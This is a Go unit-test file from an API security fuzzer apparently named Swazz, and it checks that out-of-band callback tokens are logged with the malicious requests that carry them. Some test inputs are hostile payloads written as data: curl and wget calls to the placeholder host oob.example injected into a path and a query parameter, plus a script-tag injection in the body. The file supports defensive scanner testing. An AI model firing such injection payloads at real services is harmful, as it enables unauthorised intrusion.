// Copyright (c) 2026 Swazz Authors
// This file is part of Swazz
// Swazz is licensed under the Business Source License 1.1 (BSL 1.1)
// See the LICENSE file in the project root or visit https://github.com/SecH0us3/swazz for more details

package runner

import (
	"context"
	"fmt"
	"io"
	"net/http"
	"net/http/httptest"
	"sort"
	"strings"
	"sync"
	"testing"

	"swazz-engine/internal/generator/payloads"
	"swazz-engine/internal/oob"
	"swazz-engine/internal/safenet"
	"swazz-engine/internal/swagger"

	"github.com/stretchr/testify/assert"
	"github.com/stretchr/testify/require"
)

// A MALICIOUS request registers itself with each OOB token it carries, wherever the payload put
// the token (body, query, header, cookie), and the logged body is the body as sent.
func TestExecuteRequest_MaliciousRequestIsLoggedForItsOOBTokens(t *testing.T) {
	const (
		inBody   = "11111111-1111-4111-8111-111111111111"
		inQuery  = "22222222-2222-4222-8222-222222222222"
		inHeader = "33333333-3333-4333-8333-333333333333"
		inCookie = "44444444-4444-4444-8444-444444444444"
	)
	for _, ct := range []string{"application/json", "application/x-www-form-urlencoded"} {
		t.Run(ct, func(t *testing.T) {
			var sent string
			srv := httptest.NewServer(http.HandlerFunc(func(w http.ResponseWriter, r *http.Request) {
				b, _ := io.ReadAll(r.Body)
				sent = string(b)
				w.WriteHeader(http.StatusNoContent)
			}))
			t.Cleanup(srv.Close)
			r := New(&swagger.Config{BaseURL: srv.URL, Security: swagger.SecurityConfig{AllowPrivateIPs: true}, Settings: swagger.Settings{TimeoutMs: 5000}}, srv.Client())
			t.Cleanup(r.Close)

			tokens := []string{inBody, inQuery, inHeader, inCookie}
			for _, tok := range tokens {
				r.oobStore.RegisterUUID(tok, &oob.OOBContext{Endpoint: "/hook"})
			}

			res := r.executeRequest(context.Background(), srv.URL, "/hook", "/hook", "POST",
				map[string]string{"X-Trace": "t-" + inHeader},
				map[string]string{"session": inCookie},
				map[string]any{"callback": "http://oob.example/" + inBody},
				swagger.ProfileMalicious,
				map[string]any{"next": inQuery},
				nil, ct)
			require.NotNil(t, res)
			require.Empty(t, res.Error)
			require.NotEmpty(t, sent)

			for _, tok := range tokens {
				ctx, ok := r.oobStore.GetAndRemoveUUID(tok)
				require.True(t, ok, tok)
				require.NotNil(t, ctx.Request, "request not logged for the token in %s", tok)
				assert.Equal(t, sent, ctx.Request.Body, "logged body is the wire body")
				assert.Equal(t, "POST", ctx.Request.Method)
			}
		})
	}
}

// Every part of the request is searched, and nothing but UUIDs is returned.
func TestOOBUUIDsInRequest(t *testing.T) {
	got := oobUUIDsInRequest(
		"http://h/a/aaaaaaaa-0000-4000-8000-000000000001?q=bbbbbbbb-0000-4000-8000-000000000002",
		map[string]string{"X-cccccccc-0000-4000-8000-000000000003": "dddddddd-0000-4000-8000-000000000004", "Plain": "value"},
		[]byte(`{"x":"eeeeeeee-0000-4000-8000-000000000005","y":"not-a-uuid"}`),
	)
	sort.Strings(got)
	assert.Equal(t, []string{
		"aaaaaaaa-0000-4000-8000-000000000001",
		"bbbbbbbb-0000-4000-8000-000000000002",
		"cccccccc-0000-4000-8000-000000000003",
		"dddddddd-0000-4000-8000-000000000004",
		"eeeeeeee-0000-4000-8000-000000000005",
	}, got)
	assert.Empty(t, oobUUIDsInRequest("http://h/", nil, nil))
}

// A generated request is logged for exactly the tokens its generator reports, wherever they
// went (escaped path param, query, header, body), and is not searched for others: a registered
// UUID the request carries but was not reported is left alone.
func TestExecuteGeneratedRequest_LogsReportedTokensOnly(t *testing.T) {
	const (
		inPath   = "11111111-1111-4111-8111-111111111111"
		inQuery  = "22222222-2222-4222-8222-222222222222"
		inHeader = "33333333-3333-4333-8333-333333333333"
		inBody   = "44444444-4444-4444-8444-444444444444"
		notSent  = "55555555-5555-4555-8555-555555555555" // reported, dropped before sending
		decoy    = "66666666-6666-4666-8666-666666666666" // sent, not reported
	)
	srv := httptest.NewServer(http.HandlerFunc(func(w http.ResponseWriter, _ *http.Request) {
		w.WriteHeader(http.StatusNoContent)
	}))
	t.Cleanup(srv.Close)
	r := New(&swagger.Config{BaseURL: srv.URL, Security: swagger.SecurityConfig{AllowPrivateIPs: true}, Settings: swagger.Settings{TimeoutMs: 5000}}, srv.Client())
	t.Cleanup(r.Close)

	for _, tok := range []string{inPath, inQuery, inHeader, inBody, notSent, decoy} {
		r.oobStore.RegisterUUID(tok, &oob.OOBContext{Endpoint: "/hook/{id}"})
	}

	resolved := fillPathParamsFromMap("/hook/{id}", map[string]string{"id": "curl http://oob.example/r/" + inPath})
	res := r.executeGeneratedRequest(context.Background(), srv.URL, resolved, "/hook/{id}", "POST",
		nil, nil,
		map[string]any{"callback": "<script src=\"http://oob.example/r/" + inBody + "\"></script>", "id": decoy},
		swagger.ProfileMalicious,
		map[string]any{"next": "wget http://oob.example/r/" + inQuery},
		map[string]string{"Referer": "http://oob.example/r/" + inHeader},
		"application/json",
		[]string{inPath, inQuery, inHeader, inBody, notSent})
	require.Empty(t, res.Error)

	for _, tok := range []string{inPath, inQuery, inHeader, inBody} {
		ctx, ok := r.oobStore.GetAndRemoveUUID(tok)
		require.True(t, ok)
		require.NotNil(t, ctx.Request, "request not logged for %s", tok)
		assert.Contains(t, requestLogText(ctx.Request), tok, "the logged request carries the token")
	}
	ctx, _ := r.oobStore.GetAndRemoveUUID(decoy)
	assert.Nil(t, ctx.Request, "a generated request is not searched for unreported tokens")
}

// Replays (BOLA, DIFFERENTIAL) go through ExecuteRequest, which cannot say what tokens the request
// carries: a MALICIOUS request sent that way is still searched for them, any other is not.
func TestExecuteRequest_UnknownTokensFallBackToScan(t *testing.T) {
	const tok = "77777777-7777-4777-8777-777777777777"
	srv := httptest.NewServer(http.HandlerFunc(func(w http.ResponseWriter, _ *http.Request) {
		w.WriteHeader(http.StatusNoContent)
	}))
	t.Cleanup(srv.Close)
	r := New(&swagger.Config{BaseURL: srv.URL, Security: swagger.SecurityConfig{AllowPrivateIPs: true}, Settings: swagger.Settings{TimeoutMs: 5000}}, srv.Client())
	t.Cleanup(r.Close)

	for _, profile := range []swagger.FuzzingProfile{"BOLA", "DIFFERENTIAL", swagger.ProfileMalicious} {
		r.oobStore.RegisterUUID(tok, &oob.OOBContext{Endpoint: "/hook"})
		res := r.ExecuteRequest(context.Background(), srv.URL, "/hook", "/hook", "POST", nil, nil,
			map[string]any{"cb": "http://oob.example/r/" + tok}, profile, nil, nil, "application/json")
		require.Empty(t, res.Error)
		ctx, ok := r.oobStore.GetAndRemoveUUID(tok)
		require.True(t, ok)
		if profile == swagger.ProfileMalicious {
			assert.NotNil(t, ctx.Request, "a MALICIOUS replay is searched")
		} else {
			assert.Nil(t, ctx.Request, "a %s replay is not", profile)
		}
	}
}

// End to end, on both iteration paths a MALICIOUS scan takes (plain and active parameter fuzzing),
// body and security-header iterations alike: every token the generator registers is sent, and the
// request it went out in is logged for it.
func TestFuzzing_OOBTokensGetTheirRequestDetails(t *testing.T) {
	safenet.AllowLocalNetwork = true
	t.Cleanup(func() { safenet.AllowLocalNetwork = false })

	for _, active := range []bool{false, true} {
		t.Run(fmt.Sprintf("active=%v", active), func(t *testing.T) {
			var mu sync.Mutex
			wire := map[string]bool{} // tokens seen by the target
			srv := httptest.NewServer(http.HandlerFunc(func(w http.ResponseWriter, req *http.Request) {
				b, _ := io.ReadAll(req.Body)
				var sb strings.Builder
				sb.WriteString(req.URL.RequestURI())
				for k, vs := range req.Header {
					sb.WriteString(k + ":" + strings.Join(vs, ",") + "\n")
				}
				sb.Write(b)
				mu.Lock()
				for _, tok := range uuidRegex.FindAllString(sb.String(), -1) {
					wire[tok] = true
				}
				mu.Unlock()
				w.WriteHeader(http.StatusOK)
			}))
			t.Cleanup(srv.Close)

			cfg := &swagger.Config{
				BaseURL: srv.URL,
				RunID:   "run-oob",
				Endpoints: []swagger.EndpointConfig{{
					Path:         "/hook/{id}",
					Method:       "POST",
					PathParams:   map[string]*swagger.SchemaProperty{"id": {Type: "string"}},
					QueryParams:  map[string]*swagger.SchemaProperty{"next": {Type: "string"}},
					HeaderParams: map[string]*swagger.SchemaProperty{"X-Callback": {Type: "string"}},
					Schema: swagger.SchemaProperty{Type: "object", Properties: map[string]*swagger.SchemaProperty{
						"url": {Type: "string"},
					}},
				}},
				Settings: swagger.Settings{
					IterationsPerProfile:   4,
					Concurrency:            4,
					TimeoutMs:              5000,
					ActiveParameterFuzzing: active,
					Profiles:               []swagger.FuzzingProfile{swagger.ProfileMalicious},
					PayloadCategories: map[swagger.FuzzingProfile][]string{
						swagger.ProfileMalicious: {payloads.CatOOBInteraction},
					},
				},
				Security: swagger.SecurityConfig{AllowPrivateIPs: true},
			}
			r := New(cfg, srv.Client())
			t.Cleanup(r.Close)
			ctx, err := r.initRun(context.Background())
			require.NoError(t, err)

			ep := cfg.Endpoints[0]
			gen := r.newGenerator(swagger.ProfileMalicious, ep.Method+" "+ep.Path)
			safeGen := r.newGenerator(swagger.ProfileRandom, ep.Method+" "+ep.Path)
			r.fuzzEndpoint(ctx, 0, swagger.ProfileMalicious, 0, ep, gen, safeGen, 0)
			// The run's end hands its waiting tokens over: they are checked before it.
			t.Cleanup(r.finaliseRun)

			require.NotEmpty(t, wire)
			registered := r.oobStore.Size()
			logged := 0
			for tok := range wire {
				octx, ok := r.oobStore.GetAndRemoveUUID(tok)
				if !ok {
					continue // a UUID the generator did not register as an OOB token
				}
				require.NotNil(t, octx.Request, "token %s sent without its request logged", tok)
				assert.Contains(t, requestLogText(octx.Request), tok)
				logged++
			}
			assert.Equal(t, registered, logged, "every registered token was sent and logged")
			assert.Greater(t, logged, 0)
		})
	}
}

func requestLogText(l *swagger.RequestLog) string {
	var sb strings.Builder
	sb.WriteString(l.URL)
	for k, v := range l.Headers {
		sb.WriteString(k + ":" + v + "\n")
	}
	sb.WriteString(l.Body)
	return sb.String()
}
